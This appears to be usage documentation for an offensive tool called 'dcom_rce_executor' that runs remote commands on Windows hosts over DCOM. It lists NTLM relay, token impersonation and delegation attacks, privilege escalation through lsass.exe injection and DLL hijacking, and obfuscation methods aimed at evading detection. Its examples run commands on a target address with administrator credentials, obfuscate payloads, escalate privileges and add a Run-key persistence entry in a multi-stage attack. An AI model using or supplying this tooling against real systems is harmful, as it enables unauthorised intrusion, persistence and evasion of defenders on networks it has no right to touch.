Authentication Methods
----------------------
1. NTLM - NTLM v2 authentication with credentials
2. Kerberos - Kerberos ticket-based authentication
3. NEGOTIATE (SPNEGO) - Auto-select best authentication method
4. NONE - Anonymous/Null session attacks
5. IMPERSONATION - Token impersonation attacks
6. DELEGATION - Kerberos S4U delegation attacks
7. RELAY - NTLM relay attacks

Privilege Escalation Vectors
-----------------------------
1. Process Injection - Inject into SYSTEM processes (e.g., lsass.exe)
2. Token Impersonation - Steal and duplicate SYSTEM tokens
3. Kernel Callbacks - Exploit kernel-mode callbacks for elevation
4. DLL Hijacking - Hijack system DLLs (e.g., wmiutils.dll)
5. Registry Elevation - Modify registry for SYSTEM-level execution
6. Service Exploitation - Exploit vulnerable Windows services
7. Scheduled Task - Leverage scheduled tasks for SYSTEM execution
8. COM Marshalling - Exploit COM marshalling for privilege escalation

Payload Obfuscation Techniques
-------------------------------
1. Base64 Encoding - Standard base64 encoding and decoding
2. Hex Encoding - Hexadecimal string encoding
3. XOR Cipher - XOR encryption with random key derivation
4. RC4 Cipher - RC4 stream cipher encryption
5. Polyglot Encoding - Payloads valid in multiple encoding schemes
6. Polymorphic Transform - Random transformation of payload structure
7. Dead Code Injection - Insert non-functional code blocks
8. Control Flow Flattening - Flatten nested control structures
9. String Obfuscation - Encode string literals with chr() notation
10. Junk API Calls - Insert irrelevant Windows API calls

USAGE EXAMPLES

Example 1: Basic Execution
--------------------------
from dcom_rce_executor import create_dcom_executor

executor = create_dcom_executor("192.168.1.100")
result = executor.execute_remote_command("whoami")

Example 2: Authenticated with Credentials
-------------------------------------------
executor = create_dcom_executor(
    "192.168.1.100",
    auth_method="NTLM",
    username="Administrator",
    password="Password123!",
    domain="CORP"
)
result = executor.execute_remote_command("systeminfo")

Example 3: Obfuscated Execution
--------------------------------
from dcom_rce_executor import ObfuscationTechnique

executor = create_dcom_executor(
    "192.168.1.100",
    enable_obfuscation=True,
    obfuscation_methods=[
        ObfuscationTechnique.BASE64_ENCODING,
        ObfuscationTechnique.XOR_CIPHER,
        ObfuscationTechnique.POLYMORPHIC_TRANSFORM
    ]
)
result = executor.execute_remote_command("calc.exe")

Example 4: Privilege Escalation
--------------------------------
from dcom_rce_executor import PrivilegeEscalationVec

executor = create_dcom_executor(
    "192.168.1.100",
    enable_eskalation=True,
    escalation_vec=PrivilegeEscalationVec.TOKEN_IMPERSONATION
)
result = executor.execute_remote_command("whoami /priv")

Example 5: Multi-Stage Exploitation
------------------------------------
executor = create_dcom_executor("192.168.1.100")

# Reconnaissance
stage1 = executor.execute_remote_command("systeminfo")
# Privilege Escalation
stage2 = executor.execute_remote_command("whoami /priv")
# Persistence
stage3 = executor.execute_remote_command(
    "reg add HKLM\\Software\\Microsoft\\Windows\\Run /v payload"
)

# Get comprehensive report
report = executor.get_execution_report()
print(f"Total Executions: {report['total_executions']}")

LIMITATIONS
================================================================================

1. Windows Platform Only
   - Target must be running Windows
   - DCOM services must be enabled
   - RPC endpoint mapper must be accessible (port 135)

2. Network Requirements
   - Direct network access to target required
   - Port 135 must not be firewalled
   - DCOM traffic must not be blocked

3. Authentication
   - Some auth methods require specific domain setup
   - Credentials needed for NTLM/Kerberos methods
   - Token impersonation requires existing tokens

4. Privilege Escalation
   - Success depends on target security level
   - Some techniques require specific OS versions
   - UAC may affect execution

5. Obfuscation Limitations
   - Determined obfuscators may still detect patterns
   - Memory analysis tools may reveal obfuscated payloads
   - Behavioral analysis tools may detect execution
